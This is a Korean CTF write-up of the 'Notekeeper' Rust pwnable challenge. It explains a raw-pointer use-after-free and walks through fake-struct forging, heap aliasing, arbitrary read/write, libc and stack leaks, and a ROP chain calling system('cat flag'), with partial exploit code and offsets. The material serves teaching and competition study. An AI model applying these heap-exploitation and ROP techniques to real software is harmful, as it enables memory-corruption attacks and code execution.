---
title: '[K.knock × D-Alpha × CAUtion CTF] Notekeeper | Pwnable Write-up'
date: 2026-07-26T00:00:00.000Z
recordOrder: 13
categories:
  - CTF/Wargame
tags:
  - HSPACE
  - 연합 CTF
  - Pwnable
  - Write-up
description: Rust raw pointer 수명 관리 오류로 발생한 UAF와 ROP
---
안녕하세요. somani입니다!

이번 글에서는 Rust raw pointer의 수명 관리 오류에서 발생한 UAF를 분석하고 ROP로 연결한 과정을 정리해 보려고 합니다.

## \[Pwnable\] Notekeeper Write-up

### 1. 문제 정보

문제명: Notekeeper 분야: Pwnable 점수: 100 설명: Rust is safe! 접속 정보: nc 15.164.79.100 12005 최종 플래그: CTF{dk29gmd93j2ujbnt89fdh98j3jf8j2lsmsozpafjgqpwaad}

### 2. 제공 파일

압축파일에는 다음 파일이 포함되어 있었습니다.

```text
prob
libc.so.6
ld-linux-x86-64.so.2
Dockerfile
run.sh
flag
```

prob는 64비트 Linux ELF 바이너리이며 Rust로 작성되어 있었습니다.

```text
ELF 64-bit LSB executable
x86-64
dynamically linked
stripped
```

보호기법을 확인하면 다음과 같습니다.

```text
Arch:       amd64
RELRO:      Full RELRO
NX:         Enabled
PIE:        Disabled
```

PIE가 적용되지 않았기 때문에 바이너리 내부의 전역 변수와 GOT 주소는 고정되어 있습니다.

익스플로잇에서 사용한 주요 주소는 다음과 같습니다.

```text
NOTES_GLOBAL = 0x2AE8C0
MALLOC_GOT   = 0x2ACB00
COMMAND_BSS  = 0x2AEA10
```

Full RELRO가 적용되어 있으므로 GOT overwrite는 불가능합니다. 따라서 GOT는 libc 주소를 유출하는 용도로만 사용하고, 최종적으로 스택의 반환 주소를 ROP 체인으로 덮는 방식을 사용했습니다.

### 3. 프로그램 기능 분석

프로그램을 실행하면 다음과 같은 메뉴가 출력됩니다.

```text
1. Render Note
2. Compose Note
3. Amend Note
4. Fork Note
5. Stretch Bookmark
6. Mirror Bookmark
7. Shred Note
8. Change Render Filter
```

각 기능은 대략 다음 역할을 합니다.

| 메뉴 | 기능 |
| --- | --- |
| Compose | 새로운 Note 생성 |
| Amend | Note 내용 수정 |
| Render | Note 내용 출력 및 Bookmark 생성 |
| Fork | Note를 복사하여 새로운 Note 생성 |
| Stretch | Bookmark가 가리키는 객체의 크기 변경 |
| Mirror | Bookmark가 가리키는 내용을 새 Note로 복사 |
| Shred | Note 삭제 |
| Change Render Filter | 출력 형식 변경 |

Render Filter를 Hex 형식으로 설정하면 Note의 데이터를 다음과 같이 16진수로 출력할 수 있습니다.

```text
Hex view:
41 41 41 41 42 42 42 42 ...
```

바이너리 데이터를 안정적으로 유출하기 위해 익스플로잇에서는 Hex 출력 모드를 사용했습니다.

### 4. Note 구조체

분석 결과 Note 객체는 메모리상 약 0x38바이트 구조체로 관리되고 있었습니다.

익스플로잇에서는 다음과 같이 가짜 Note 구조체를 만들었습니다.

```python
def fake_note(note_id, ptr, size=0x70, capacity=None, flag=1):
    if capacity is None:
        capacity = size
```

```python
    return b"".join((
        p64(note_id),    # +0x00
        p64(size),       # +0x08
        p64(flag),       # +0x10
        p64(capacity),   # +0x18
        p64(ptr),        # +0x20: Vec 데이터 포인터
        p64(size),       # +0x28: Vec 길이
        p64(size),       # +0x30: Vec 용량
    ))
```

중요한 부분은 다음 세 필드입니다.

```text
+0x20 : 데이터 포인터
+0x28 : 데이터 길이
+0x30 : 데이터 용량
```

이 부분을 조작할 수 있다면 Note의 출력 기능으로 임의 주소를 읽고, Note 수정 기능으로 임의 주소에 데이터를 쓸 수 있습니다.

### 5. 취약점 원인

#### 5.1 Bookmark에 raw pointer 저장

Note를 Render하면 해당 Note를 가리키는 Bookmark가 생성됩니다.

문제는 Bookmark가 Note 객체를 안전한 Rust 참조나 스마트 포인터로 관리하는 것이 아니라, Note 객체의 주소를 raw pointer 형태로 저장한다는 점입니다.

개념적으로 다음과 같은 형태입니다.

```text
bookmark.note = note_ptr;
```

#### 5.2 Shred 후 Bookmark가 제거되지 않음

Shred Note를 실행하면 Note 객체는 해제됩니다.

하지만 그 Note를 가리키던 Bookmark는 함께 제거되지 않습니다.

```text
Bookmark ────────> Note 객체
                    ↓
                 Shred 실행
                    ↓
Bookmark ────────> 해제된 메모리
```

결과적으로 Bookmark에는 이미 해제된 Note 객체의 주소가 남습니다.

즉, 전형적인 Use-After-Free 취약점이 발생합니다.

Rust는 기본적으로 메모리 안전성을 제공하지만, 프로그램 내부에서 raw pointer 또는 unsafe 동작을 잘못 사용하면 이와 같은 UAF가 발생할 수 있습니다.

문제 설명의 Rust is safe!는 이를 의도적으로 강조한 문구였습니다.

### 6. 익스플로잇 과정

#### 6.1 기본 Note 생성

먼저 세 개의 Note를 생성합니다.

```text
source = compose(0x38)
target = compose(0x38)
victim = compose(0x10)
```

각 Note의 역할은 다음과 같습니다.

```text
source : 가짜 Note 구조체 데이터를 저장
target : 이후 controller 구조체를 덮는 용도
victim : UAF를 발생시킬 대상
```

#### 6.2 Victim Bookmark 생성

victim을 Render하여 Bookmark를 생성합니다.

```text
render(victim)
```

이 시점의 상태는 다음과 같습니다.

```text
Bookmark(victim) ─────> victim Note 객체
```

#### 6.3 가짜 Note 구조체 준비

source Note 안에 가짜 Note 구조체를 저장합니다.

```text
forged = fake_note(
    note_id=victim,
    ptr=NOTES_GLOBAL
)
```

```text
amend(source, forged)
```

가짜 구조체의 데이터 포인터는 전역 Note 관리 영역인 0x2AE8C0을 가리키도록 설정했습니다.

#### 6.4 Victim 해제

이제 victim Note를 삭제합니다.

```text
shred(victim)
```

victim Note 객체는 해제되지만 Bookmark에는 victim 객체 주소가 그대로 남아 있습니다.

```text
Bookmark(victim) ─────> freed chunk
```

#### 6.5 Fork를 이용한 해제 영역 재사용

source를 Fork하면 source의 데이터가 새로운 heap chunk로 복사됩니다.

```text
forged_owner = fork(source)
```

이 과정에서 allocator가 방금 해제된 victim의 0x38 크기 Note 객체 영역을 재사용합니다.

그 위치에는 source에 저장했던 가짜 Note 구조체가 복사됩니다.

따라서 stale Bookmark는 이제 victim Note가 아니라 공격자가 만든 가짜 Note 구조체를 가리키게 됩니다.

```text
Bookmark(victim)
       │
       ▼
+-----------------------------+
| 공격자가 만든 fake Note     |
| ptr = 0x2AE8C0              |
| len = 0x70                  |
| cap = 0x70                  |
+-----------------------------+
```

forged\_owner Note의 내용을 수정하면 재사용된 fake Note 구조체도 계속 변경할 수 있습니다.

#### 6.6 Mirror를 이용한 임의 주소 읽기

Mirror Bookmark는 Bookmark가 가리키는 Note의 데이터를 새로운 Note에 복사합니다.

현재 Bookmark는 가짜 Note를 가리키며, 가짜 Note의 데이터 포인터는 NOTES\_GLOBAL을 가리킵니다.

따라서 다음 동작으로 전역 Note 관리 영역을 복사할 수 있습니다.

```text
leak_note = mirror(victim)
globals_data = render(leak_note)
```

Hex Filter를 사용했기 때문에 출력된 데이터를 바이트 배열로 복구할 수 있습니다.

```python
target_note = u64(globals_data[0x10:0x18])
```

이를 통해 target Note 구조체의 heap 주소를 얻습니다.

#### 6.7 Target Note의 데이터 포인터 유출

가짜 Note의 데이터 포인터를 방금 얻은 target Note 구조체 주소로 변경합니다.

```text
payload = fake_note(
    note_id=victim,
    ptr=target_note,
    size=0x38,
    capacity=0x38
)
```

```text
amend(forged_owner, payload)
```

다시 Mirror를 호출합니다.

```text
leak_struct = mirror(victim)
target_struct = render(leak_struct)
```

Note 구조체의 +0x20 위치에는 실제 데이터 포인터가 저장되어 있으므로 다음과 같이 추출합니다.

```python
target_data = u64(target_struct[0x20:0x28])
```

이제 target Note가 사용하는 데이터 버퍼의 heap 주소도 알 수 있습니다.

#### 6.8 Stretch를 이용한 dangling pointer 생성

가짜 Note의 데이터 포인터가 target\_data를 가리키도록 변경합니다.

```text
payload = fake_note(
    note_id=victim,
    ptr=target_data,
    size=0x38,
    capacity=0x38
)
```

```text
amend(forged_owner, payload)
```

그 후 stale Bookmark를 대상으로 Stretch를 호출합니다.

```text
stretch(victim, 0x70)
```

Stretch 과정에서 데이터 버퍼에 대해 realloc이 실행됩니다.

기존 0x38 크기 버퍼는 해제되고, 더 큰 0x70 크기 버퍼가 새로 할당됩니다.

하지만 실제 target Note 구조체는 이러한 변경을 알지 못합니다. 따라서 target의 데이터 포인터는 해제된 이전 0x38 chunk를 계속 가리킵니다.

```text
target.data ─────> freed 0x38 chunk
```

#### 6.9 Controller Note와 heap alias 생성

이제 새로운 Note를 생성합니다.

```text
controller = compose(0x10)
```

Note 구조체의 크기가 0x38이므로 allocator는 앞에서 해제된 target의 데이터 chunk를 controller Note 객체로 재사용합니다.

따라서 다음과 같은 alias가 형성됩니다.

```text
target.data ─────> controller Note 구조체
```

즉, target의 내용을 수정하면 controller의 Note 구조체 자체를 덮을 수 있습니다.

#### 6.10 Controller 구조체 조작

controller Note의 데이터 포인터가 malloc@GOT을 가리키도록 target을 수정합니다.

```text
payload = fake_note(
    note_id=controller,
    ptr=MALLOC_GOT,
    size=0x38,
    capacity=0x38,
    flag=0
)
```

```text
amend(target, payload)
```

target의 stale data pointer가 controller Note 구조체를 가리키고 있으므로, 위 데이터가 controller의 메타데이터가 됩니다.

이제 Render(controller)를 호출하면 malloc@GOT 주소에 저장된 값을 출력합니다.

```python
got_data = render(controller)
malloc_addr = u64(got_data[:8])
```

이 시점부터 다음 원시 기능을 얻습니다.

```text
Render(controller) → 임의 주소 읽기
Amend(controller)  → 임의 주소 쓰기
```

controller 구조체의 데이터 포인터는 target을 통해 계속 변경할 수 있습니다.

### 7. Libc 주소 계산

제공된 libc.so.6에서 malloc의 오프셋은 다음과 같습니다.

```text
MALLOC_OFF = 0xAD640
```

따라서 libc base는 다음과 같이 계산합니다.

```text
libc_base = malloc_addr - MALLOC_OFF
```

실제 원격 실행에서는 다음과 같은 주소가 유출됐습니다.

```text
libc=0x762727137000
```

ASLR로 인해 실행할 때마다 주소는 달라질 수 있습니다.

### 8. 임의 읽기·쓰기 함수

controller의 Vec 메타데이터를 조작하여 arbitrary read와 arbitrary write를 구현했습니다.

```python
임의 읽기
def arbitrary_read(address, size):
    metadata = fake_note(
        controller,
        address,
        size,
        size,
        flag=0
    )
```

```python
    amend(target, metadata)
    return render(controller)[:size]
```

controller의 데이터 포인터를 원하는 주소로 설정하고 Render를 호출합니다.

```python
임의 쓰기
def arbitrary_write(address, data):
    metadata = fake_note(
        controller,
        address,
        len(data),
        len(data),
        flag=0
    )
```

```text
    amend(target, metadata)
    amend(controller, data)
```

controller의 데이터 포인터를 원하는 주소로 설정한 뒤 Amend를 호출합니다.

### 9. Environ을 이용한 스택 주소 유출

libc에는 현재 환경변수 포인터가 저장된 environ 전역 변수가 존재합니다.

제공된 libc에서 environ 오프셋은 다음과 같습니다.

```text
ENVIRON_OFF = 0x20AD58
```

임의 읽기로 environ 값을 읽습니다.

```python
environ = u64(
    arbitrary_read(libc_base + ENVIRON_OFF, 8)
)
```

원격 실행 결과:

```text
environ=0x7fff94e21fa8
```

environ은 스택 내부를 가리키므로 이를 기준으로 현재 메뉴 함수의 저장된 반환 주소를 계산할 수 있습니다.

분석 결과 저장된 RIP는 environ보다 0x460 낮은 곳에 있었습니다.

```text
saved_rip = environ - 0x460
```

원격 실행 결과:

```text
saved_rip=0x7fff94e21b48
```

### 10. ROP 체인 구성

먼저 고정된 BSS 영역에 실행할 명령어를 기록합니다.

```text
COMMAND_BSS = 0x2AEA10
```

```text
arbitrary_write(
    COMMAND_BSS,
    b"cat flag\x00"
)
```

사용한 libc 오프셋은 다음과 같습니다.

```text
SYSTEM_OFF      = 0x58740
EXIT_OFF        = 0x47B90
POP_RDI_RET_OFF = 0x10F75B
RET_OFF         = 0x10F75C
```

ROP 체인은 다음과 같이 구성합니다.

```text
rop = flat(
    libc_base + RET_OFF,
    libc_base + POP_RDI_RET_OFF,
    COMMAND_BSS,
    libc_base + SYSTEM_OFF,
    libc_base + EXIT_OFF
)
```

실행 흐름은 다음과 같습니다.

```text
ret
  ↓
pop rdi ; ret
  ↓
rdi = 0x2AEA10
  ↓
system("cat flag")
  ↓
exit()
```

첫 번째 ret gadget은 system 호출 시 스택 정렬 문제를 방지하기 위한 것입니다.

### 11. 반환 주소 덮기

controller의 데이터 포인터를 저장된 RIP 주소로 변경합니다.

```text
metadata = fake_note(
    controller,
    saved_rip,
    len(rop),
    len(rop),
    flag=0
)
```

```text
amend(target, metadata)
```

이제 controller Note의 데이터 포인터는 현재 Amend 함수의 반환 주소를 가리킵니다.

다음 Amend 호출로 ROP 체인을 기록합니다.

```text
amend(controller, rop)
```

이 Amend 함수가 종료되면서 덮어쓴 반환 주소가 사용되고, ROP 체인이 실행됩니다.

최종적으로 다음 명령이 실행됩니다.

cat flag

### 12. 개행 바이트 문제

프로그램은 입력을 read\_line() 형태로 처리합니다.

따라서 payload 내부에 0x0a 바이트가 포함되면 입력이 중간에서 잘립니다.

특히 ASLR로 생성된 libc 및 stack 주소 안에 우연히 0x0a가 포함될 수 있습니다.

이를 처리하기 위해 payload에 개행 바이트가 존재하는지 검사했습니다.

```python
def contains_newline(data):
    return b"\n" in data
```

문제가 발생하면 연결을 종료하고 다시 시도하도록 구성했습니다.

```python
for attempt in range(1, 6):
    try:
        exploit()
        break
    except Exception:
        reconnect()
```

### 13. 익스플로잇 실행

Windows PowerShell에서 다음과 같이 실행했습니다.

```bash
cd C:\Users\MinJun\Downloads
py .\rust_is_safe_solve.py 15.164.79.100 12005
```

실행 결과:

```text
[*] attempt 1
[+] libc=0x762727137000 environ=0x7fff94e21fa8 saved_rip=0x7fff94e21b48
Note amended
CTF{dk29gmd93j2ujbnt89fdh98j3jf8j2lsmsozpafjgqpwaad}
```

```text
[+] FLAG: CTF{dk29gmd93j2ujbnt89fdh98j3jf8j2lsmsozpafjgqpwaad}
```

### 14. 전체 공격 흐름 요약

```text
Render
  └─ Bookmark에 Note raw pointer 저장
```

```text
Shred
  └─ Note만 해제되고 Bookmark는 남음
       → Use-After-Free
```

```text
Fork
  └─ 해제된 Note 영역에 가짜 Note 구조체 배치
```

```text
Mirror
  └─ 가짜 Note의 ptr을 이용해 임의 주소 읽기
```

```text
Stretch
  └─ target 버퍼 realloc
       → target에 dangling pointer 생성
```

```text
Compose
  └─ 해제된 target 버퍼에 controller Note 구조체 배치
```

```text
Amend(target)
  └─ controller Note 메타데이터 덮기
```

```text
Render(controller)
  └─ arbitrary read
```

```text
Amend(controller)
  └─ arbitrary write
```

```text
malloc@GOT leak
  └─ libc base 계산
```

```text
libc environ leak
  └─ stack 및 saved RIP 계산
```

```text
saved RIP overwrite
  └─ system("cat flag") ROP 실행
```

### 15. 결론

이 문제의 핵심 취약점은 Rust 자체의 메모리 안전성 문제가 아니라, 프로그램에서 Bookmark가 Note 객체를 raw pointer로 관리하면서 객체 수명을 제대로 검증하지 않은 것입니다.

Shred 이후에도 Bookmark가 삭제되지 않아 Use-After-Free가 발생했고, Fork, Mirror, Stretch의 heap 할당 동작을 조합하여 다음 단계로 발전시킬 수 있었습니다.

```text
Use-After-Free
→ Fake Note
→ Arbitrary Read
→ Heap Alias
→ Arbitrary Read/Write
→ Libc Leak
→ Stack Leak
→ ROP
```

최종 플래그는 다음과 같습니다.

```text
CTF{dk29gmd93j2ujbnt89fdh98j3jf8j2lsmsozpafjgqpwaad}
```

> 각 상세 풀이의 서버 주소와 데이터는 당시 CTF 환경을 기준으로 기록했으며, 현재 운영 상태와는 다를 수 있습니다.

읽어주셔서 감사합니다. (꾸벅)
